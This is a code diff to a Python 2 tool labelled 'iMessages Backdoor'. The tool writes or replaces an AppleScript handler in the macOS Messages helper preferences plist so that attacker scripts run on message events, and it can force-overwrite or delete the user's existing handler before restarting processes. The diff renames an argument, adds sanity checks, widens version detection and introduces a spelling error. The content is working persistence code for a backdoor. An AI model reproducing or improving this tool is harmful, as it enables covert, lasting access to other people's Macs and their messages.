@@ -8,7 +8,7 @@ import time
 
 #Argument Parsing
 parser = argparse.ArgumentParser(description='iMessages Backdoor')
-parser.add_argument('-plist', type=str, help='The name of the applescript file that will be stored in the iMessages configuration file.')
+parser.add_argument('-handler', type=str, help='The name of the applescript file that will be stored in the iMessages configuration file.')
 parser.add_argument('--force', help='Force overwriting of the users current applescript event handler', action='store_true')
 parser.add_argument('--delete', help='Delete the current script handler and quit execution.', action='store_true')
 parser.add_argument('--verbose', help='Display debugging messages.', action='store_true')
@@ -21,7 +21,7 @@ homedir = os.path.expanduser('~')
 path = homedir + "/Library/Containers/com.apple.soagent/Data/Library/Preferences/com.apple.messageshelper.AlertsController.plist"
 scriptspath = None
 currentScript = ""
-newScript = arguments.plist
+newScript = arguments.handler
 
 def get_key(path):
     p = subprocess.Popen(["defaults","read",path,'AppleScriptNameKey'],
@@ -72,16 +72,26 @@ def delete_key(oldScript, path):
                           stderr=subprocess.STDOUT)
 
 
-
 #Check version of OSX we're running
 #~/Library/Application Scripts/Com.apple.iChat for any macs newer than 10.7
 #~/Library/Scripts/Messages for any macs 10.7 and older.
+
+
+#Sanity Checks:
+if newScript is None and arguments.delete==False:
+    print "[!] No AppleScript handler set! Exiting."
+    exit()
+if arguments.delete==True and arguments.force==True:
+    print "[!] Please don't set both Force and Delete, only select one! Exiting."
+    exit()
+
 macversion = platform.mac_ver()[0].split(".")
 print "[INFO] Running Mac OSX " + macversion[0] + "." + macversion[1] + "." + macversion[2]
 if int(macversion[0]) == 10 and int(macversion[1]) <= 7:
     scriptspath = homedir + "/Library/Scripts/Messages/"
     print "[INFO] Using scripts path: " + scriptspath
-elif int(macversion[0]) == 10 and int(macversion[1]) == 12:
+#elif int(macversion[0]) == 10 and int(macversion[1]) >= 7:
+else:
     scriptspath = homedir + "/Library/Application Scripts/Com.apple.iChat/"
     print "[INFO] Using scripts path: " + scriptspath 
                           
@@ -90,7 +100,7 @@ elif int(macversion[0]) == 10 and int(macversion[1]) == 12:
 if check_if_exists(path):
     print "[+] Plist file found! Using file: " + path
 else:
-    print "[!] File Not Found, time to bail."
+    print "[!] File Not Founfd, time to bail."
     failed_exit("check if the plist file exists, the file: " + path + " was not found!")
 
 #Check to see if there's a value already written to the plist file.
@@ -101,10 +111,11 @@ for line in get_key(path):
 if arguments.delete==True:
     try:
         if "does not exist" in currentScript:
-            failed_exit("deleting the key, no key is currently set!")
+            failed_exit("deleting the key, no key is currently set!","")
         else:
             delete_key(currentScript, path)
-            successful_exit()
+            restart_procs()
+            exit()
     except Exception, e:
         failed_exit("delete the old key from the plist",e)
 
@@ -128,6 +139,5 @@ else:
             failed_exit("write new script into the plist.",e)
     else:
         failed_exit("write new script into the plist, a handler already exists. To overwrite the current handler and continue, use the --force flag.","")
-time.sleep(5)
 restart_procs()
 exit()
